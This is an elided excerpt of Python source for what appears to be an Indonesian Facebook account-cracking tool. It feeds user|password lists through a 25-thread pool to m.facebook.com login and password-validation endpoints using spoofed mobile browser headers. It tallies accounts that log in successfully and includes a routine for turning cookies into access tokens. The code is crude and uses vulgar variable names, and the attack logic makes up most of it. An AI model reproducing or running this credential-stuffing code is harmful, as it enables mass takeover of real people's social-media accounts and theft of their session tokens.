	...
	def cek_opsi(self):
		...
		with __Kiky__(max_workers=25) as kontok:
			for memek in buka_baju:
				...
				titid  = kontol.split("|")
				try:
					kontok.submit(self.method, titid[0], titid[1],titid[2])
				except:
...
#			print("\033[0;96m\033[0;97m[\033[1;32m➤\033[1;37m] Successful/OK To Login : 
			kata += (f"{q}[\033[1;32m✓{q}] \033[1;32mSELAMAT AKUN ANDA AMAN(SUKSES) ATAU {o}%s{q}\n"%(str(len(xe))))
			num = 0
			for _ in xe:
				num += 1
				kata += ("  "+str(num)+" "+_[0][0]+", "+_[0][1]+"\n")
...
#			print("\033[0;96m\033[0;97m[\033[1;31m➤\033[1;37m] Login Failed! User Id/Password Is Incorrect\n")
			kata += (f"{q}[{m}!{q}]{m} Login Gagal Atau Username Dan Password Salah\n")
		print(f"{q}[{o}#{q}] {q}{user}|{pasw}|{ttl}\n{kata}")
		...
		try:
			...
			for pw in memek:
				if "ke1" == method:
					...
					head={"Host":"m.facebook.com","connection":"keep-alive","cache-control":"max-age=0","upgrade-insecure-requests":"1","dnt":"1","user-agent":ua,"sec-fetch-dest":"document","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","x-requested-with":"mark.via.gp"}
					p = session.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=head).text
					...
					po = session.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
...
#				os.sys.exit()
	...
	def __eaab__(self):
		with requests.Session() as r:
			...
			if len(find) == 0:
				kotak("# MOHON MAAF, SEPERTINYA COOKIES ANDA TIDAK BISA DIUBAH KETOKEN",M,Q)
#				os.sys.exit()
			else:
				for y in find:
